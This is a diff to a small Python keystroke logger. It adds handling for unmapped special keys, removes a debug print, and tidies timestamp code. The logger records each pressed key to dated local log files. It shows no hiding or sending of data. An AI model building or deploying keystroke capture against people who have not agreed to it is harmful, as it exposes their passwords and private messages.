@@ -6,12 +6,9 @@ dict1 = {
     "Key.backspace":"backspace",
     "Key.enter": "enter"
 }
-
 current_datetime = datetime.now()
 current_time = current_datetime.strftime("%d-%m-%Y")
-print(f"***** {current_time} *****")
 file_name = f"logs/{current_time}.txt"
-content = "This is some text for my new file."
 current_time = current_datetime.strftime("%d/%m/%Y %H:%M:%S")
 
 with open(file_name, "w") as file:
@@ -33,7 +30,12 @@ def on_press(key):
 
     except AttributeError:
         tempKey = str(key)
-        tempKey = dict1[tempKey]
+        if tempKey in dict1:
+            tempKey = dict1[tempKey]
+        else:
+            tempKey = " '"+tempKey+"' "
+
+
         if tempKey == "backspace":
             data = ''
             with open(file_name, "r") as f:
@@ -49,7 +51,7 @@ def on_press(key):
         # print(f'Special key pressed: {key}')
     # print(tempKey)
     current_datetime = datetime.now()
-    tempTime = current_datetime.strftime("%d/%m/%Y %H:%M:%S")
+    tempTime = datetime.now().strftime("%d/%m/%Y %H:%M:%S")
     if tempTime != current_time:
         with open(file_name, "a") as file:
             file.write("\n***** " + tempTime + " *****\n")
